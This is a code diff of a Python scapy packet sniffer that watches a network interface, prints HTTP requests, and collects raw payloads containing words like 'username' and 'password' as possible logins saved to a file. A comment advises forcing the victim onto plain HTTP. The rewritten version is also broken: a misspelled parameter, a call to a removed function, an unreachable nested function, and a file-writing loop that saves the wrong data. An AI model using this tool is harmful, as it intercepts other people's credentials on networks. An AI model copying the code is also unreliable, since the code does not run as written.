@@ -1,33 +1,51 @@
-import scapy.all as scapy
+'''
+This Tool Use Scapy Package!
+Feel Free TO Edit It Is Yours!
+I Will Clean The Code On That Update And Add Some Things!
+'''
+import scapy.all as scapy 
 from scapy.layers import http
 
-print("\t\t\t\t[+] << PACKET-SNIFFER >> [+]")
+def SmallBanner():
+	Banner = "\t\t\t\t[+] << PACKET-SNIFFER >> [+]"
+	print(Banner)
 
-inter_face = input("\n[+] Enter Interface: ")
+# Get Inputs First!
+PossibleLoginList = []
+InterFace = input("\n[+] Enter Interface: ") # EX: eth0 , wlan0
 
-print("\n\n")
-def sniff(interface):
-	scapy.sniff(iface=interface,store=False,prn=sniff_Packet)
+def StartSniffData(NetowrkInterface):
+	scapy.sniff(iface=NetworkInterface,store=False,prn=SniffNetworkTrafic)
 
-def get_url(packet):
+def GetDataFromHTTP(packet): # Get Data From HTTP Requests And Responses If You Want To Capture HTTPS Reqqests And Responses You Have To Force The Victim To Use HTTP Protocol!
 	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+	def GetLoginDataFromSites(packet):
+		if packet.haslayer(scapy.Raw):
+			DataLoaded = packet[scapy.Raw].load
+			KeyWords = ["username","login","password","user","pass"] # You Can Add More KeyWords Here!
+			for LoginKeyWord in KeyWords:
+				if LoginKeyWord in DataLoaded:
+					return DataLoaded
+					break # LOL IDK Why I But Break If There is An Return Function But I Will Leave That Here LOL
 
-def get_login_information(packet):
-	if packet.haslayer(scapy.Raw):
-		load = packet[scapy.Raw].load
-		keys = ["username","login","password","user","pass"]
-		for keyword in keys:
-			if keyword in load:
-				return load
-				break
-
-def sniff_Packet(packet):
+def SniffNetworkTrafic(packet):
 	if packet.haslayer(http.HTTPRequest):
 		url = get_url(packet)
 		print("[+] HTTP REQUEST >>" + url)
 
-		login_info = get_login_information(packet)
-		if login_info:
-			print("\n\n[+] Possible User/Password >> " + login_info + "\n\n")
+		LoginData = GetLoginDataFromSites(packet)
+		if LoginData: # If Login Data Returns 'True' Then Do That Print Function
+			PossibleLoginList.append(LoginData)
+			print("\n[+] Possible User/Password >> {0} \n".format(LoginData))
 
-sniff(inter_face)
+def ExtractAllPossibleLoginsOnTXT():
+	FileName = input("Give Me A Name For Logins File: ") # EX : Login
+	for Data in PossibleLoginList:
+		with open('{0}.txt'.format(FileName),'w') as LoginsFile:
+			LoginFile.write("{0}\n".format(FileName))
+		print("[+] Data Saved!")
+
+# Start Functions After Get Inputs!
+SmallBanner()
+StartSniffData(InterFace)
+ExtractAllPossibleLoginsOnTXT()
